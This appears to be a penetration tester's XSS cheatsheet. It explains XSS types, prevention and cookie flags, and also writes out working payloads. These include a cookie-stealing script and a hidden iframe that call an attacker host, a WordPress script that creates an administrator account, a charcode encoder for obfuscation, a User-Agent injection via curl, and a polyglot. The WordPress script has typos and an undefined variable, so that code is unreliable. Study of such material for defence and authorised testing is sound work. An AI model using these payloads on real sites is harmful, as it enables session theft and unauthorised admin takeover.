# XSS Cheatsheet

## Introduction

[Portswigger](https://portswigger.net/web-security/cross-site-scripting) states that: *"Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data."*

XSS manipulates a vulnerable web site to return malicious JavaScript to victims. The JavaScript is either executed client-side in the browser or server-side in a database or cached by the server. All XSS payloads are executed in the context of the user that visited the page with the XSS payload. Unsanitized data can allow attacker to inject client side scripts into web pages and execute malicious code. [THM XSS Room](https://tryhackme.com/r/room/axss): *"One of the earliest XSS vulnerabilities was recognized in 1999 and led to CERT advisory [CA-2000-02](https://vuls.cert.org/confluence/display/historical/CERT+Advisory+CA-2000-02+Malicious+HTML+Tags+Embedded+in+Client+Web+Requests)".

For executing malicious JavaScript client-side the attacker is targeting the browser parsers to access and modify the DOM. *[The Document Object Model (DOM)](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) is a programming interface for web documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects; that way, programming languages can interact with the page.. without the it*  *the JavaScript language wouldn't have any model or notion of web pages, HTML documents, SVG documents, and their component parts..The DOM is not part of the JavaScript language, but is instead a Web API used to build websites.*

XSS is a vulnerability that allows for the injection of malicious JavaScript into a web page that can then viewed by another user bypassing the Same-Origin Policy. SOP is security mechanism to prevent malicious scripts on one page accessing data to another; defined as:
- Protocol
- Hostname
- Port

XSS is a client-side attack affecting other users' browsers that are browsing the same web page as the malicious script. Different browser have different DOM parsers and process some JavaScript differently. Developer Tools in your [[Browsers]] are very important for enumerating and developing valid payloads:
Developer Tools Hotkeys
- Firefox, press `Ctrl + Shift + K`
- Google Chrome, press `Ctrl + Shift + J`
- Safari, press `Command + Option + J`

For executing server-side malicious JavaScript is *stored* as data passed via a input field into a database of a web site or into the server's cached memory.  

#### Reasons XSS may exist on a page:

[THM XSS Room](https://tryhackme.com/r/room/axss):
- Insufficient input validation and sanitization
- Lack of output encoding
- Improper use of security headers
- Framework and language vulnerabilities
- Third-party libraries
#### Implications and Use Cases of XSS

[THM XSS Room](https://tryhackme.com/r/room/axss):
- Session hijacking
- Phishing and credential theft
- Social engineering
- Content manipulation and defacement
- Data exfiltration
- Malware installation

[Portswigger XSS](https://portswigger.net/web-security/cross-site-scripting):
- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.

## [Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting) 

- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting)
	- Description:
		 - A vulnerability existing in Client Side code rather than Server-Side code leads to the victims Browser executing malicious JavaScript
		- Is a variant of either [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting) or [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) that occurs client-side in a browser's generated internal Document Object Model (DOM), which creates a DOM tree to then render the page - executing malicious JavaScript in the process of rendering the page.
	- Affects:
	- Identifying Vulnerabilities:
		- Is there access to the DOM?
		- Can data be written back to the DOM?
	- Subclasses
	- Notes:
		- Sometimes called:
			- DOM XSS
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting) 
	- Description:
		- Payload is stored in website's database or cached by server 
		- Web application retrieves and displays to all that visit that page
	- Affects:
		- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting) or Server-Side
		- Victims that visit the affect page
	- Identifying Vulnerabilities:
		- Unsanitized / Raw page functionality that stores data into a Database or Server's cache
			- For Example - anything allowing HTML, JavaScript:
				- Comments sections on blogs posts
				- User nicknames
				- Contact Details
				- Customer Orders
	- Subclasses:
		- *Blind cross-site scripting (XSS) is a type of [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) in which the data exit point is not accessible to the attacker, for example due to a lack of privileges.* - [Portswigger](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss)
	- Notes:
		- Sometimes called:
			- Persistent XSS
			- Second-order XSS
-  [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting)
	- Description:
		- Payload resides in a link or HTTP request and attacks the user submitting the request or visiting the link 
		- *Reflected attacks are those where the injected script is reflected off the web server such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request* -  [OWASP](https://owasp.org/www-community/attacks/xss/)
	- Affects:
		- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting) or Server-Side
			- Either:
				- Link/Request is malicious script executed by the browser
				- Victims of [[Social-Engineering]] to click a link in a Email message 
		- User that is force to request the link via [[Cross-Site-Request-Forgery]] or is a victim of [[Social-Engineering]] to [[click-the-link]]
	- Identifying Vulnerabilities: 
		- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
		- wherever *an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way* - [Portswigger](https://portswigger.net/web-security/cross-site-scripting)
	- Subclasses
	- Notes
- [Self-XSS](https://en.wikipedia.org/wiki/Self-XSS) 
	- Description:
		- When a user is victim of [[Social-Engineering]] that SE attack deceives the victim to execute malicious JavaScript directly into the user's own browser.
	- Affects:
		- Users browser
		- SE-able Users
	- Identifying Vulnerabilities:
		- Non-technical users 
		- Individual that are not fluent or understand JavaScript or the Browser Development tools embedded in the browser they use.
	- Subclasses
	- Notes
- Mutation XSS
	- Description:
		- Injection that is rewritten and modified by browser while parsing the markup
	- Affects:
		- XSS-Type Related
	- Identifying Vulnerabilities:
	- Subclasses
	- Notes
		- [Mutation XSS - medium Article contains unfindable OWASP reference](https://medium.com/@anmolbagul20/mutation-xss-a6c048ad65fd)
	- Articles:
		- [Michał Bentkowski - Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
		- [Gareth Heyes - # Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- [[Server-Side-XSS]]
## Prevention and Mitigation

A defence in depth approach should be applied as data should be sanitised in every location to where the data is passed. Consider reviewing the most up-to-date versions of:
- [XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

[OWASP - The Ultimate Cheatsheet for XSS Protection for Developers](https://owasp.org/www-pdf-archive//Xenotix_XSS_Protection_CheatSheet_For_Developers.pdf)

[Portswigger](https://portswigger.net/web-security/cross-site-scripting) prevents:
- **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
- **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
- **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
- **Content Security Policy.** As a last line of defence, you can use [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

Regarding Cookies - [Mozilla Cookie security relating to XSS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie):
- *Use the `HttpOnly` attribute to prevent access to cookie values via JavaScript.*
	- *Cookies created via JavaScript can't include the `HttpOnly` flag*
- Cookie Lifetimes 
- *`SameSite` attribute set to `Strict` or `Lax` .. ensures that the authentication cookie isn't sent with cross-site requests*
- *`Secure` [flag](https://en.wikipedia.org/wiki/Secure_cookie) instructs the browser to only send the cookie over encrypted connections to prevent sniffing plain text sensitive data.*

## Identifying XSS

If the application does not filtering or removing these characters by removing or encoding (URL and HTML), it may be vulnerable to XSS.
```js
< >   // HTML elements
{}    // JavaScript function declarations
'' "" // JavaScript string declarations
;     // JavaScript statement termination
```

- Review the JavaScript Code 
- Does the Browser has a update-to-date [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) or can it be circumvented? 
- Can you capture data like [[Cross-Site-Request-Forgery]] tokens with [Dangling Markup Injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
## Useful Tricks

Listener at the ready you can check if you get a connection back:
```html
<img src=http://$attacker-ip:port />
```
[Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)

Content injection, server a file with an iframe of no size sending victims browser to a client-side attack or to script that gathers information. 
```html
<iframe> src=http://$attacker-ip:port/file height=”0” width=”0”></iframe>
```

Cookie Stealing
```html
<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

Bypass payload size restrictions by [linking to an external Javascript file](https://www.youtube.com/watch?v=Uo3cL4nrGOk).

With iframes see either `src` indicative of a URL or content with `data` or `srcdoc` in [Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 

Use Minification and encoding with JavaScript in Browser developer console to encode minifed Javascript payloads
```js
// use https://jscompress.com or similar to minify JavaScript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

#### Privilege Escalation with New Admin User creation

[Shift8 Article - Create an Admin user](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) 
```js
// Get the Wordpress Nounce in Javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var wp_nonceRegex = /ser" value="([^"]*?)"/g;
wajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
// Then create a new admin user with JavaScript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=theattacker&email=theattacker@whatever.com&pass1=attackpass&pass2=attackpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
Deliver Payload - article recommends [javascript-minifier.com](https://javascript-minifier.com/) - Use Minification and encoding with JavaScript in Browser developer console to encode minifed Javascript payloads
```js
// Use or similar to minify JavaScript: 
// https://jscompress.com 
// https://javascript-minifier.com/)
// Then encode:
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Use `curl` to send via `burpsuite` proxy for modification if required to a the vulnerable web site
```bash
curl -i http://vulnwordpress.com --user-agent "<script>eval(String.fromCharCode($encodedJS))</script>" --proxy 127.0.0.1:8080
```
## XSS Polyglots
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

## SKing7's XSS Filter Evasion Cheat Sheet

This cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defence for XSS which these tests can be used to illustrate. [Sking7](https://sking7.github.io/articles/218647712.html)

## Objectives?

- Steal cookies or session information (like [[Session-Tokens]]) if session management configuration is insecure
	- Important Cookie flags:
		- `Secure` [flag](https://en.wikipedia.org/wiki/Secure_cookie) instructs the browser to only send the cookie over encrypted connections  
		- `HttpOnly` [flag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) instructs the browser to deny JavaScript access to the cookie - if it is not set we can use XSS to steal a cookie
			- *Cookies created via JavaScript can't include the `HttpOnly` flag*
- Privilege Escalation via using JavaScript to add another administrative account
- Defacement
## References

[OWASP](https://owasp.org/www-community/attacks/xss/)
[XSS Prevention Cheatsheet from OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
[DOM XSS Prevention Cheatsheet from OWASP ](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
[XSS Wiki](https://en.wikipedia.org/wiki/Cross-site_scripting)
[sking7](https://sking7.github.io/articles/218647712.html)
[Bankrobber Ippsec Video](https://www.youtube.com/watch?v=zYmA9ECuCio)
[OWASP community - Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
[Hacktrick Iframes in XSS, CSP, and SOP](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp) 
[Wikipedia Secure Cookie flag](https://en.wikipedia.org/wiki/Secure_cookie) 
[Mozilla Secure and HttpOnly Cookie ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookie)
[Portswigger XSS](https://portswigger.net/web-security/cross-site-scripting)
[Portswigger Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting)
[Wikipedia Self-XSS](https://en.wikipedia.org/wiki/Self-XSS) 
[Mozilla DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)
[Michał Bentkowski -  Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
[Gareth Heyes - # Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
[Portswigger Testing for Blind XSS](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss)
[javascript-minifier.com](https://javascript-minifier.com/)
[Shift8 Article - Create an Admin user in Wordpress](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) 
[THM Intro to Cross-site Scripting](https://tryhackme.com/r/room/xss)
[THM XSS Room](https://tryhackme.com/r/room/axss)
[CA-2000-02](https://vuls.cert.org/confluence/display/historical/CERT+Advisory+CA-2000-02+Malicious+HTML+Tags+Embedded+in+Client+Web+Requests).